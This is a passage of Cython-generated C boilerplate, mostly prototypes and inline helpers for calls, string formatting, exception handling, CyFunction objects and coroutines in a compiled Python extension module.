#define __Pyx_PyObject_FastCall(func, args, nargs)  __Pyx_PyObject_FastCallDict(func, args, (size_t)(nargs), NULL)
static CYTHON_INLINE PyObject* __Pyx_PyObject_FastCallDict(PyObject *func, PyObject **args, size_t nargs, PyObject *kwargs);

/* PyObjectCallOneArg.proto */
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg);

/* PyObject_Str.proto */
#define __Pyx_PyObject_Str(obj)\
    (likely(PyString_CheckExact(obj)) ? __Pyx_NewRef(obj) : PyObject_Str(obj))

/* PyObjectFormatSimple.proto */
#if CYTHON_COMPILING_IN_PYPY
    #define __Pyx_PyObject_FormatSimple(s, f) (\
        likely(PyUnicode_CheckExact(s)) ? (Py_INCREF(s), s) :\
        PyObject_Format(s, f))
#elif PY_MAJOR_VERSION < 3
    #define __Pyx_PyObject_FormatSimple(s, f) (\
        likely(PyUnicode_CheckExact(s)) ? (Py_INCREF(s), s) :\
        likely(PyString_CheckExact(s)) ? PyUnicode_FromEncodedObject(s, NULL, "strict") :\
        PyObject_Format(s, f))
#elif CYTHON_USE_TYPE_SLOTS
    #define __Pyx_PyObject_FormatSimple(s, f) (\
        likely(PyUnicode_CheckExact(s)) ? (Py_INCREF(s), s) :\
        likely(PyLong_CheckExact(s)) ? PyLong_Type.tp_repr(s) :\
        likely(PyFloat_CheckExact(s)) ? PyFloat_Type.tp_repr(s) :\
        PyObject_Format(s, f))
#else
    #define __Pyx_PyObject_FormatSimple(s, f) (\
        likely(PyUnicode_CheckExact(s)) ? (Py_INCREF(s), s) :\
        PyObject_Format(s, f))
#endif

/* JoinPyUnicode.proto */
static PyObject* __Pyx_PyUnicode_Join(PyObject* value_tuple, Py_ssize_t value_count, Py_ssize_t result_ulength,
                                      Py_UCS4 max_char);

/* PySequenceContains.proto */
static CYTHON_INLINE int __Pyx_PySequence_ContainsTF(PyObject* item, PyObject* seq, int eq) {
    int result = PySequence_Contains(seq, item);
    return unlikely(result < 0) ? result : (result == (eq == Py_EQ));
}

/* StrEquals.proto */
#if PY_MAJOR_VERSION >= 3
#define __Pyx_PyString_Equals __Pyx_PyUnicode_Equals
#else
#define __Pyx_PyString_Equals __Pyx_PyBytes_Equals
#endif

/* ListAppend.proto */
#if CYTHON_USE_PYLIST_INTERNALS && CYTHON_ASSUME_SAFE_MACROS
static CYTHON_INLINE int __Pyx_PyList_Append(PyObject* list, PyObject* x) {
    PyListObject* L = (PyListObject*) list;
    Py_ssize_t len = Py_SIZE(list);
    if (likely(L->allocated > len) & likely(len > (L->allocated >> 1))) {
        Py_INCREF(x);
        #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030d0000
        L->ob_item[len] = x;
        #else
        PyList_SET_ITEM(list, len, x);
        #endif
        __Pyx_SET_SIZE(list, len + 1);
        return 0;
    }
    return PyList_Append(list, x);
}
#else
#define __Pyx_PyList_Append(L,x) PyList_Append(L,x)
#endif

/* PyObjectLookupSpecial.proto */
#if CYTHON_USE_PYTYPE_LOOKUP && CYTHON_USE_TYPE_SLOTS
#define __Pyx_PyObject_LookupSpecialNoError(obj, attr_name)  __Pyx__PyObject_LookupSpecial(obj, attr_name, 0)
#define __Pyx_PyObject_LookupSpecial(obj, attr_name)  __Pyx__PyObject_LookupSpecial(obj, attr_name, 1)
static CYTHON_INLINE PyObject* __Pyx__PyObject_LookupSpecial(PyObject* obj, PyObject* attr_name, int with_error);
#else
#define __Pyx_PyObject_LookupSpecialNoError(o,n) __Pyx_PyObject_GetAttrStrNoError(o,n)
#define __Pyx_PyObject_LookupSpecial(o,n) __Pyx_PyObject_GetAttrStr(o,n)
#endif

/* GetTopmostException.proto */
#if CYTHON_USE_EXC_INFO_STACK && CYTHON_FAST_THREAD_STATE
static _PyErr_StackItem * __Pyx_PyErr_GetTopmostException(PyThreadState *tstate);
#endif

/* SaveResetException.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_ExceptionSave(type, value, tb)  __Pyx__ExceptionSave(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx__ExceptionSave(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#define __Pyx_ExceptionReset(type, value, tb)  __Pyx__ExceptionReset(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx__ExceptionReset(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb);
#else
#define __Pyx_ExceptionSave(type, value, tb)   PyErr_GetExcInfo(type, value, tb)
#define __Pyx_ExceptionReset(type, value, tb)  PyErr_SetExcInfo(type, value, tb)
#endif

/* GetException.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_GetException(type, value, tb)  __Pyx__GetException(__pyx_tstate, type, value, tb)
static int __Pyx__GetException(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#else
static int __Pyx_GetException(PyObject **type, PyObject **value, PyObject **tb);
#endif

/* RaiseDoubleKeywords.proto */
static void __Pyx_RaiseDoubleKeywordsError(const char* func_name, PyObject* kw_name);

/* ParseKeywords.proto */
static int __Pyx_ParseOptionalKeywords(PyObject *kwds, PyObject *const *kwvalues,
    PyObject **argnames[],
    PyObject *kwds2, PyObject *values[], Py_ssize_t num_pos_args,
    const char* function_name);

/* RaiseArgTupleInvalid.proto */
static void __Pyx_RaiseArgtupleInvalid(const char* func_name, int exact,
    Py_ssize_t num_min, Py_ssize_t num_max, Py_ssize_t num_found);

/* GCCDiagnostics.proto */
#if !defined(__INTEL_COMPILER) && defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 6))
#define __Pyx_HAS_GCC_DIAGNOSTIC
#endif

/* BuildPyUnicode.proto */
static PyObject* __Pyx_PyUnicode_BuildFromAscii(Py_ssize_t ulength, char* chars, int clength,
                                                int prepend_sign, char padding_char);

/* CIntToPyUnicode.proto */
static CYTHON_INLINE PyObject* __Pyx_PyUnicode_From_Py_ssize_t(Py_ssize_t value, Py_ssize_t width, char padding_char, char format_char);

/* PyObjectCall2Args.proto */
static CYTHON_INLINE PyObject* __Pyx_PyObject_Call2Args(PyObject* function, PyObject* arg1, PyObject* arg2);

/* PyObjectGetMethod.proto */
static int __Pyx_PyObject_GetMethod(PyObject *obj, PyObject *name, PyObject **method);

/* PyObjectCallMethod1.proto */
static PyObject* __Pyx_PyObject_CallMethod1(PyObject* obj, PyObject* method_name, PyObject* arg);

/* append.proto */
static CYTHON_INLINE int __Pyx_PyObject_Append(PyObject* L, PyObject* x);

/* DictGetItem.proto */
#if PY_MAJOR_VERSION >= 3 && !CYTHON_COMPILING_IN_PYPY
static PyObject *__Pyx_PyDict_GetItem(PyObject *d, PyObject* key);
#define __Pyx_PyObject_Dict_GetItem(obj, name)\
    (likely(PyDict_CheckExact(obj)) ?\
     __Pyx_PyDict_GetItem(obj, name) : PyObject_GetItem(obj, name))
#else
#define __Pyx_PyDict_GetItem(d, key) PyObject_GetItem(d, key)
#define __Pyx_PyObject_Dict_GetItem(obj, name)  PyObject_GetItem(obj, name)
#endif

/* PyIntBinop.proto */
#if !CYTHON_COMPILING_IN_PYPY
static PyObject* __Pyx_PyInt_AddObjC(PyObject *op1, PyObject *op2, long intval, int inplace, int zerodivision_check);
#else
#define __Pyx_PyInt_AddObjC(op1, op2, intval, inplace, zerodivision_check)\
    (inplace ? PyNumber_InPlaceAdd(op1, op2) : PyNumber_Add(op1, op2))
#endif

/* FastTypeChecks.proto */
#if CYTHON_COMPILING_IN_CPYTHON
#define __Pyx_TypeCheck(obj, type) __Pyx_IsSubtype(Py_TYPE(obj), (PyTypeObject *)type)
#define __Pyx_TypeCheck2(obj, type1, type2) __Pyx_IsAnySubtype2(Py_TYPE(obj), (PyTypeObject *)type1, (PyTypeObject *)type2)
static CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b);
static CYTHON_INLINE int __Pyx_IsAnySubtype2(PyTypeObject *cls, PyTypeObject *a, PyTypeObject *b);
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject *type);
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *type1, PyObject *type2);
#else
#define __Pyx_TypeCheck(obj, type) PyObject_TypeCheck(obj, (PyTypeObject *)type)
#define __Pyx_TypeCheck2(obj, type1, type2) (PyObject_TypeCheck(obj, (PyTypeObject *)type1) || PyObject_TypeCheck(obj, (PyTypeObject *)type2))
#define __Pyx_PyErr_GivenExceptionMatches(err, type) PyErr_GivenExceptionMatches(err, type)
#define __Pyx_PyErr_GivenExceptionMatches2(err, type1, type2) (PyErr_GivenExceptionMatches(err, type1) || PyErr_GivenExceptionMatches(err, type2))
#endif
#define __Pyx_PyErr_ExceptionMatches2(err1, err2)  __Pyx_PyErr_GivenExceptionMatches2(__Pyx_PyErr_CurrentExceptionType(), err1, err2)
#define __Pyx_PyException_Check(obj) __Pyx_TypeCheck(obj, PyExc_Exception)

/* RaiseUnboundLocalError.proto */
static CYTHON_INLINE void __Pyx_RaiseUnboundLocalError(const char *varname);

/* RaiseTooManyValuesToUnpack.proto */
static CYTHON_INLINE void __Pyx_RaiseTooManyValuesError(Py_ssize_t expected);

/* RaiseNeedMoreValuesToUnpack.proto */
static CYTHON_INLINE void __Pyx_RaiseNeedMoreValuesError(Py_ssize_t index);

/* IterFinish.proto */
static CYTHON_INLINE int __Pyx_IterFinish(void);

/* UnpackItemEndCheck.proto */
static int __Pyx_IternextUnpackEndCheck(PyObject *retval, Py_ssize_t expected);

/* PyObjectCallNoArg.proto */
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallNoArg(PyObject *func);

/* pep479.proto */
static void __Pyx_Generator_Replace_StopIteration(int in_async_gen);

/* StringJoin.proto */
#if PY_MAJOR_VERSION < 3
#define __Pyx_PyString_Join __Pyx_PyBytes_Join
#define __Pyx_PyBaseString_Join(s, v) (PyUnicode_CheckExact(s) ? PyUnicode_Join(s, v) : __Pyx_PyBytes_Join(s, v))
#else
#define __Pyx_PyString_Join PyUnicode_Join
#define __Pyx_PyBaseString_Join PyUnicode_Join
#endif
static CYTHON_INLINE PyObject* __Pyx_PyBytes_Join(PyObject* sep, PyObject* values);

/* SliceObject.proto */
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetSlice(
        PyObject* obj, Py_ssize_t cstart, Py_ssize_t cstop,
        PyObject** py_start, PyObject** py_stop, PyObject** py_slice,
        int has_cstart, int has_cstop, int wraparound);

/* PyObjectCallMethod0.proto */
static PyObject* __Pyx_PyObject_CallMethod0(PyObject* obj, PyObject* method_name);

/* RaiseNoneIterError.proto */
static CYTHON_INLINE void __Pyx_RaiseNoneNotIterableError(void);

/* UnpackTupleError.proto */
static void __Pyx_UnpackTupleError(PyObject *, Py_ssize_t index);

/* UnpackTuple2.proto */
#define __Pyx_unpack_tuple2(tuple, value1, value2, is_tuple, has_known_size, decref_tuple)\
    (likely(is_tuple || PyTuple_Check(tuple)) ?\
        (likely(has_known_size || PyTuple_GET_SIZE(tuple) == 2) ?\
            __Pyx_unpack_tuple2_exact(tuple, value1, value2, decref_tuple) :\
            (__Pyx_UnpackTupleError(tuple, 2), -1)) :\
        __Pyx_unpack_tuple2_generic(tuple, value1, value2, has_known_size, decref_tuple))
static CYTHON_INLINE int __Pyx_unpack_tuple2_exact(
    PyObject* tuple, PyObject** value1, PyObject** value2, int decref_tuple);
static int __Pyx_unpack_tuple2_generic(
    PyObject* tuple, PyObject** value1, PyObject** value2, int has_known_size, int decref_tuple);

/* dict_iter.proto */
static CYTHON_INLINE PyObject* __Pyx_dict_iterator(PyObject* dict, int is_dict, PyObject* method_name,
                                                   Py_ssize_t* p_orig_length, int* p_is_dict);
static CYTHON_INLINE int __Pyx_dict_iter_next(PyObject* dict_or_iter, Py_ssize_t orig_length, Py_ssize_t* ppos,
                                              PyObject** pkey, PyObject** pvalue, PyObject** pitem, int is_dict);

/* ListCompAppend.proto */
#if CYTHON_USE_PYLIST_INTERNALS && CYTHON_ASSUME_SAFE_MACROS
static CYTHON_INLINE int __Pyx_ListComp_Append(PyObject* list, PyObject* x) {
    PyListObject* L = (PyListObject*) list;
    Py_ssize_t len = Py_SIZE(list);
    if (likely(L->allocated > len)) {
        Py_INCREF(x);
        #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030d0000
        L->ob_item[len] = x;
        #else
        PyList_SET_ITEM(list, len, x);
        #endif
        __Pyx_SET_SIZE(list, len + 1);
        return 0;
    }
    return PyList_Append(list, x);
}
#else
#define __Pyx_ListComp_Append(L,x) PyList_Append(L,x)
#endif

/* GetItemInt.proto */
#define __Pyx_GetItemInt(o, i, type, is_signed, to_py_func, is_list, wraparound, boundscheck)\
    (__Pyx_fits_Py_ssize_t(i, type, is_signed) ?\
    __Pyx_GetItemInt_Fast(o, (Py_ssize_t)i, is_list, wraparound, boundscheck) :\
    (is_list ? (PyErr_SetString(PyExc_IndexError, "list index out of range"), (PyObject*)NULL) :\
               __Pyx_GetItemInt_Generic(o, to_py_func(i))))
#define __Pyx_GetItemInt_List(o, i, type, is_signed, to_py_func, is_list, wraparound, boundscheck)\
    (__Pyx_fits_Py_ssize_t(i, type, is_signed) ?\
    __Pyx_GetItemInt_List_Fast(o, (Py_ssize_t)i, wraparound, boundscheck) :\
    (PyErr_SetString(PyExc_IndexError, "list index out of range"), (PyObject*)NULL))
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_List_Fast(PyObject *o, Py_ssize_t i,
                                                              int wraparound, int boundscheck);
#define __Pyx_GetItemInt_Tuple(o, i, type, is_signed, to_py_func, is_list, wraparound, boundscheck)\
    (__Pyx_fits_Py_ssize_t(i, type, is_signed) ?\
    __Pyx_GetItemInt_Tuple_Fast(o, (Py_ssize_t)i, wraparound, boundscheck) :\
    (PyErr_SetString(PyExc_IndexError, "tuple index out of range"), (PyObject*)NULL))
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_Tuple_Fast(PyObject *o, Py_ssize_t i,
                                                              int wraparound, int boundscheck);
static PyObject *__Pyx_GetItemInt_Generic(PyObject *o, PyObject* j);
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_Fast(PyObject *o, Py_ssize_t i,
                                                     int is_list, int wraparound, int boundscheck);

/* IncludeStructmemberH.proto */
#include <structmember.h>

/* FixUpExtensionType.proto */
#if CYTHON_USE_TYPE_SPECS
static int __Pyx_fix_up_extension_type_from_spec(PyType_Spec *spec, PyTypeObject *type);
#endif

/* ValidateBasesTuple.proto */
#if CYTHON_COMPILING_IN_CPYTHON || CYTHON_COMPILING_IN_LIMITED_API || CYTHON_USE_TYPE_SPECS
static int __Pyx_validate_bases_tuple(const char *type_name, Py_ssize_t dictoffset, PyObject *bases);
#endif

/* PyType_Ready.proto */
CYTHON_UNUSED static int __Pyx_PyType_Ready(PyTypeObject *t);

/* PyObject_GenericGetAttrNoDict.proto */
#if CYTHON_USE_TYPE_SLOTS && CYTHON_USE_PYTYPE_LOOKUP && PY_VERSION_HEX < 0x03070000
static CYTHON_INLINE PyObject* __Pyx_PyObject_GenericGetAttrNoDict(PyObject* obj, PyObject* attr_name);
#else
#define __Pyx_PyObject_GenericGetAttrNoDict PyObject_GenericGetAttr
#endif

/* Import.proto */
static PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level);

/* ImportFrom.proto */
static PyObject* __Pyx_ImportFrom(PyObject* module, PyObject* name);

/* ImportDottedModule.proto */
static PyObject *__Pyx_ImportDottedModule(PyObject *name, PyObject *parts_tuple);
#if PY_MAJOR_VERSION >= 3
static PyObject *__Pyx_ImportDottedModule_WalkParts(PyObject *module, PyObject *name, PyObject *parts_tuple);
#endif

/* FetchSharedCythonModule.proto */
static PyObject *__Pyx_FetchSharedCythonABIModule(void);

/* FetchCommonType.proto */
#if !CYTHON_USE_TYPE_SPECS
static PyTypeObject* __Pyx_FetchCommonType(PyTypeObject* type);
#else
static PyTypeObject* __Pyx_FetchCommonTypeFromSpec(PyObject *module, PyType_Spec *spec, PyObject *bases);
#endif

/* PyMethodNew.proto */
#if CYTHON_COMPILING_IN_LIMITED_API
static PyObject *__Pyx_PyMethod_New(PyObject *func, PyObject *self, PyObject *typ) {
    PyObject *typesModule=NULL, *methodType=NULL, *result=NULL;
    CYTHON_UNUSED_VAR(typ);
    if (!self)
        return __Pyx_NewRef(func);
    typesModule = PyImport_ImportModule("types");
    if (!typesModule) return NULL;
    methodType = PyObject_GetAttrString(typesModule, "MethodType");
    Py_DECREF(typesModule);
    if (!methodType) return NULL;
    result = PyObject_CallFunctionObjArgs(methodType, func, self, NULL);
    Py_DECREF(methodType);
    return result;
}
#elif PY_MAJOR_VERSION >= 3
static PyObject *__Pyx_PyMethod_New(PyObject *func, PyObject *self, PyObject *typ) {
    CYTHON_UNUSED_VAR(typ);
    if (!self)
        return __Pyx_NewRef(func);
    return PyMethod_New(func, self);
}
#else
    #define __Pyx_PyMethod_New PyMethod_New
#endif

/* PyVectorcallFastCallDict.proto */
#if CYTHON_METH_FASTCALL
static CYTHON_INLINE PyObject *__Pyx_PyVectorcall_FastCallDict(PyObject *func, __pyx_vectorcallfunc vc, PyObject *const *args, size_t nargs, PyObject *kw);
#endif

/* CythonFunctionShared.proto */
#define __Pyx_CyFunction_USED
#define __Pyx_CYFUNCTION_STATICMETHOD  0x01
#define __Pyx_CYFUNCTION_CLASSMETHOD   0x02
#define __Pyx_CYFUNCTION_CCLASS        0x04
#define __Pyx_CYFUNCTION_COROUTINE     0x08
#define __Pyx_CyFunction_GetClosure(f)\
    (((__pyx_CyFunctionObject *) (f))->func_closure)
#if PY_VERSION_HEX < 0x030900B1 || CYTHON_COMPILING_IN_LIMITED_API
  #define __Pyx_CyFunction_GetClassObj(f)\
      (((__pyx_CyFunctionObject *) (f))->func_classobj)
#else
  #define __Pyx_CyFunction_GetClassObj(f)\
      ((PyObject*) ((PyCMethodObject *) (f))->mm_class)
#endif
#define __Pyx_CyFunction_SetClassObj(f, classobj)\
    __Pyx__CyFunction_SetClassObj((__pyx_CyFunctionObject *) (f), (classobj))
#define __Pyx_CyFunction_Defaults(type, f)\
    ((type *)(((__pyx_CyFunctionObject *) (f))->defaults))
#define __Pyx_CyFunction_SetDefaultsGetter(f, g)\
    ((__pyx_CyFunctionObject *) (f))->defaults_getter = (g)
typedef struct {
#if CYTHON_COMPILING_IN_LIMITED_API
    PyObject_HEAD
    PyObject *func;
#elif PY_VERSION_HEX < 0x030900B1
    PyCFunctionObject func;
#else
    PyCMethodObject func;
#endif
#if CYTHON_BACKPORT_VECTORCALL
    __pyx_vectorcallfunc func_vectorcall;
#endif
#if PY_VERSION_HEX < 0x030500A0 || CYTHON_COMPILING_IN_LIMITED_API
    PyObject *func_weakreflist;
#endif
    PyObject *func_dict;
    PyObject *func_name;
    PyObject *func_qualname;
    PyObject *func_doc;
    PyObject *func_globals;
    PyObject *func_code;
    PyObject *func_closure;
#if PY_VERSION_HEX < 0x030900B1 || CYTHON_COMPILING_IN_LIMITED_API
    PyObject *func_classobj;
#endif
    void *defaults;
    int defaults_pyobjects;
    size_t defaults_size;
    int flags;
    PyObject *defaults_tuple;
    PyObject *defaults_kwdict;
    PyObject *(*defaults_getter)(PyObject *);
    PyObject *func_annotations;
    PyObject *func_is_coroutine;
} __pyx_CyFunctionObject;
#undef __Pyx_CyOrPyCFunction_Check
#define __Pyx_CyFunction_Check(obj)  __Pyx_TypeCheck(obj, __pyx_CyFunctionType)
#define __Pyx_CyOrPyCFunction_Check(obj)  __Pyx_TypeCheck2(obj, __pyx_CyFunctionType, &PyCFunction_Type)
#define __Pyx_CyFunction_CheckExact(obj)  __Pyx_IS_TYPE(obj, __pyx_CyFunctionType)
static CYTHON_INLINE int __Pyx__IsSameCyOrCFunction(PyObject *func, void *cfunc);
#undef __Pyx_IsSameCFunction
#define __Pyx_IsSameCFunction(func, cfunc)   __Pyx__IsSameCyOrCFunction(func, cfunc)
static PyObject *__Pyx_CyFunction_Init(__pyx_CyFunctionObject* op, PyMethodDef *ml,
                                      int flags, PyObject* qualname,
                                      PyObject *closure,
                                      PyObject *module, PyObject *globals,
                                      PyObject* code);
static CYTHON_INLINE void __Pyx__CyFunction_SetClassObj(__pyx_CyFunctionObject* f, PyObject* classobj);
static CYTHON_INLINE void *__Pyx_CyFunction_InitDefaults(PyObject *m,
                                                         size_t size,
                                                         int pyobjects);
static CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsTuple(PyObject *m,
                                                            PyObject *tuple);
static CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsKwDict(PyObject *m,
                                                             PyObject *dict);
static CYTHON_INLINE void __Pyx_CyFunction_SetAnnotationsDict(PyObject *m,
                                                              PyObject *dict);
static int __pyx_CyFunction_init(PyObject *module);
#if CYTHON_METH_FASTCALL
static PyObject * __Pyx_CyFunction_Vectorcall_NOARGS(PyObject *func, PyObject *const *args, size_t nargsf, PyObject *kwnames);
static PyObject * __Pyx_CyFunction_Vectorcall_O(PyObject *func, PyObject *const *args, size_t nargsf, PyObject *kwnames);
static PyObject * __Pyx_CyFunction_Vectorcall_FASTCALL_KEYWORDS(PyObject *func, PyObject *const *args, size_t nargsf, PyObject *kwnames);
static PyObject * __Pyx_CyFunction_Vectorcall_FASTCALL_KEYWORDS_METHOD(PyObject *func, PyObject *const *args, size_t nargsf, PyObject *kwnames);
#if CYTHON_BACKPORT_VECTORCALL
#define __Pyx_CyFunction_func_vectorcall(f) (((__pyx_CyFunctionObject*)f)->func_vectorcall)
#else
#define __Pyx_CyFunction_func_vectorcall(f) (((PyCFunctionObject*)f)->vectorcall)
#endif
#endif

/* CythonFunction.proto */
static PyObject *__Pyx_CyFunction_New(PyMethodDef *ml,
                                      int flags, PyObject* qualname,
                                      PyObject *closure,
                                      PyObject *module, PyObject *globals,
                                      PyObject* code);

/* UnicodeConcatInPlace.proto */
# if CYTHON_COMPILING_IN_CPYTHON && PY_MAJOR_VERSION >= 3
    #if CYTHON_REFNANNY
        #define __Pyx_PyUnicode_ConcatInPlace(left, right) __Pyx_PyUnicode_ConcatInPlaceImpl(&left, right, __pyx_refnanny)
    #else
        #define __Pyx_PyUnicode_ConcatInPlace(left, right) __Pyx_PyUnicode_ConcatInPlaceImpl(&left, right)
    #endif
    static CYTHON_INLINE PyObject *__Pyx_PyUnicode_ConcatInPlaceImpl(PyObject **p_left, PyObject *right
        #if CYTHON_REFNANNY
        , void* __pyx_refnanny
        #endif
    );
#else
#define __Pyx_PyUnicode_ConcatInPlace __Pyx_PyUnicode_Concat
#endif
#define __Pyx_PyUnicode_ConcatInPlaceSafe(left, right) ((unlikely((left) == Py_None) || unlikely((right) == Py_None)) ?\
    PyNumber_InPlaceAdd(left, right) : __Pyx_PyUnicode_ConcatInPlace(left, right))

/* PyObjectSetAttrStr.proto */
#if CYTHON_USE_TYPE_SLOTS
#define __Pyx_PyObject_DelAttrStr(o,n) __Pyx_PyObject_SetAttrStr(o, n, NULL)
static CYTHON_INLINE int __Pyx_PyObject_SetAttrStr(PyObject* obj, PyObject* attr_name, PyObject* value);
#else
#define __Pyx_PyObject_DelAttrStr(o,n)   PyObject_DelAttr(o,n)
#define __Pyx_PyObject_SetAttrStr(o,n,v) PyObject_SetAttr(o,n,v)
#endif

/* SwapException.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_ExceptionSwap(type, value, tb)  __Pyx__ExceptionSwap(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx__ExceptionSwap(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#else
static CYTHON_INLINE void __Pyx_ExceptionSwap(PyObject **type, PyObject **value, PyObject **tb);
#endif

/* ObjectGetItem.proto */
#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject *__Pyx_PyObject_GetItem(PyObject *obj, PyObject *key);
#else
#define __Pyx_PyObject_GetItem(obj, key)  PyObject_GetItem(obj, key)
#endif

/* PyIntBinop.proto */
#if !CYTHON_COMPILING_IN_PYPY
static PyObject* __Pyx_PyInt_SubtractObjC(PyObject *op1, PyObject *op2, long intval, int inplace, int zerodivision_check);
#else
#define __Pyx_PyInt_SubtractObjC(op1, op2, intval, inplace, zerodivision_check)\
    (inplace ? PyNumber_InPlaceSubtract(op1, op2) : PyNumber_Subtract(op1, op2))
#endif

/* CLineInTraceback.proto */
#ifdef CYTHON_CLINE_IN_TRACEBACK
#define __Pyx_CLineForTraceback(tstate, c_line)  (((CYTHON_CLINE_IN_TRACEBACK)) ? c_line : 0)
#else
static int __Pyx_CLineForTraceback(PyThreadState *tstate, int c_line);
#endif

/* CodeObjectCache.proto */
#if !CYTHON_COMPILING_IN_LIMITED_API
typedef struct {
    PyCodeObject* code_object;
    int code_line;
} __Pyx_CodeObjectCacheEntry;
struct __Pyx_CodeObjectCache {
    int count;
    int max_count;
    __Pyx_CodeObjectCacheEntry* entries;
};
static struct __Pyx_CodeObjectCache __pyx_code_cache = {0,0,NULL};
static int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line);
static PyCodeObject *__pyx_find_code_object(int code_line);
static void __pyx_insert_code_object(int code_line, PyCodeObject* code_object);
#endif

/* AddTraceback.proto */
static void __Pyx_AddTraceback(const char *funcname, int c_line,
                               int py_line, const char *filename);

/* CIntToPy.proto */
static CYTHON_INLINE PyObject* __Pyx_PyInt_From_long(long value);

/* CIntFromPy.proto */
static CYTHON_INLINE long __Pyx_PyInt_As_long(PyObject *);

/* FormatTypeName.proto */
#if CYTHON_COMPILING_IN_LIMITED_API
typedef PyObject *__Pyx_TypeName;
#define __Pyx_FMT_TYPENAME "%U"
static __Pyx_TypeName __Pyx_PyType_GetName(PyTypeObject* tp);
#define __Pyx_DECREF_TypeName(obj) Py_XDECREF(obj)
#else
typedef const char *__Pyx_TypeName;
#define __Pyx_FMT_TYPENAME "%.200s"
#define __Pyx_PyType_GetName(tp) ((tp)->tp_name)
#define __Pyx_DECREF_TypeName(obj)
#endif

/* CIntFromPy.proto */
static CYTHON_INLINE int __Pyx_PyInt_As_int(PyObject *);

/* RaiseException.proto */
static void __Pyx_Raise(PyObject *type, PyObject *value, PyObject *tb, PyObject *cause);

/* CoroutineBase.proto */
struct __pyx_CoroutineObject;
typedef PyObject *(*__pyx_coroutine_body_t)(struct __pyx_CoroutineObject *, PyThreadState *, PyObject *);
#if CYTHON_USE_EXC_INFO_STACK
#define __Pyx_ExcInfoStruct  _PyErr_StackItem
#else
typedef struct {
    PyObject *exc_type;
    PyObject *exc_value;
    PyObject *exc_traceback;
} __Pyx_ExcInfoStruct;
#endif
typedef struct __pyx_CoroutineObject {
    PyObject_HEAD
    __pyx_coroutine_body_t body;
    PyObject *closure;
    __Pyx_ExcInfoStruct gi_exc_state;
    PyObject *gi_weakreflist;
    PyObject *classobj;
    PyObject *yieldfrom;
    PyObject *gi_name;
    PyObject *gi_qualname;
    PyObject *gi_modulename;
    PyObject *gi_code;
    PyObject *gi_frame;
    int resume_label;
    char is_running;
} __pyx_CoroutineObject;
static __pyx_CoroutineObject *__Pyx__Coroutine_New(
    PyTypeObject *type, __pyx_coroutine_body_t body, PyObject *code, PyObject *closure,
    PyObject *name, PyObject *qualname, PyObject *module_name);
static __pyx_CoroutineObject *__Pyx__Coroutine_NewInit(
            __pyx_CoroutineObject *gen, __pyx_coroutine_body_t body, PyObject *code, PyObject *closure,
            PyObject *name, PyObject *qualname, PyObject *module_name);
static CYTHON_INLINE void __Pyx_Coroutine_ExceptionClear(__Pyx_ExcInfoStruct *self);
static int __Pyx_Coroutine_clear(PyObject *self);
static PyObject *__Pyx_Coroutine_Send(PyObject *self, PyObject *value);
static PyObject *__Pyx_Coroutine_Close(PyObject *self);
static PyObject *__Pyx_Coroutine_Throw(PyObject *gen, PyObject *args);
#if CYTHON_USE_EXC_INFO_STACK
#define __Pyx_Coroutine_SwapException(self)
#define __Pyx_Coroutine_ResetAndClearException(self)  __Pyx_Coroutine_ExceptionClear(&(self)->gi_exc_state)
#else
#define __Pyx_Coroutine_SwapException(self) {\
    __Pyx_ExceptionSwap(&(self)->gi_exc_state.exc_type, &(self)->gi_exc_state.exc_value, &(self)->gi_exc_state.exc_traceback);\
    __Pyx_Coroutine_ResetFrameBackpointer(&(self)->gi_exc_state);\
    }
#define __Pyx_Coroutine_ResetAndClearException(self) {\
    __Pyx_ExceptionReset((self)->gi_exc_state.exc_type, (self)->gi_exc_state.exc_value, (self)->gi_exc_state.exc_traceback);\
    (self)->gi_exc_state.exc_type = (self)->gi_exc_state.exc_value = (self)->gi_exc_state.exc_traceback = NULL;\
    }
#endif
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyGen_FetchStopIterationValue(pvalue)\
    __Pyx_PyGen__FetchStopIterationValue(__pyx_tstate, pvalue)
#else
#define __Pyx_PyGen_FetchStopIterationValue(pvalue)\
    __Pyx_PyGen__FetchStopIterationValue(__Pyx_PyThreadState_Current, pvalue)
#endif
static int __Pyx_PyGen__FetchStopIterationValue(PyThreadState *tstate, PyObject **pvalue);
static CYTHON_INLINE void __Pyx_Coroutine_ResetFrameBackpointer(__Pyx_ExcInfoStruct *exc_state);

/* PatchModuleWithCoroutine.proto */
static PyObject* __Pyx_Coroutine_patch_module(PyObject* module, const char* py_code);

/* PatchGeneratorABC.proto */
static int __Pyx_patch_abc(void);

/* Generator.proto */
#define __Pyx_Generator_USED
#define __Pyx_Generator_CheckExact(obj) __Pyx_IS_TYPE(obj, __pyx_GeneratorType)
#define __Pyx_Generator_New(body, code, closure, name, qualname, module_name)\
    __Pyx__Coroutine_New(__pyx_GeneratorType, body, code, closure, name, qualname, module_name)
